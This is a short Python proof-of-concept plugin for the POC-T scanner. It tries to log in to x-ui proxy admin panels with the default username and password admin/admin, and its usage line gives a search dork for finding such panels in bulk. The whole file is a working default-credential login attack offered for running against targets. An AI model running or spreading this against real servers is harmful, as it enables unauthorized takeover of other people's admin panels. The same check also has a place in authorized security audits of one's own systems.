#!/usr/bin/env python
# -*- encoding: utf-8 -*-
'''
@File    :   ssr-xui_weak_pass.py.py
@DateTime :  2023/3/11 18:01
@Usage:
    python2 POC-T.py -s ssr-xui_weak_pass.py -aF "port=54321 && body='xui'"

'''

from lib.utils.http import request, get_schemed_url, urljoin_ex
from lib.core.data import logger


def _get_post_data(pwd="admin"):
    pwd = pwd.strip()
    post_data = {
        "username": "admin",
        "password": pwd
    }
    return post_data


def poc(url):
    url = get_schemed_url(url)
    login_url = urljoin_ex(url, "/login")

    # 1
    post_data = _get_post_data()
    resp = request("POST", login_url, json=post_data, verify=0, timeout=15)
    if not resp:
        return False

    if "false" in resp.text:
        return False

    else:
        logger.info(resp.text)
        return True
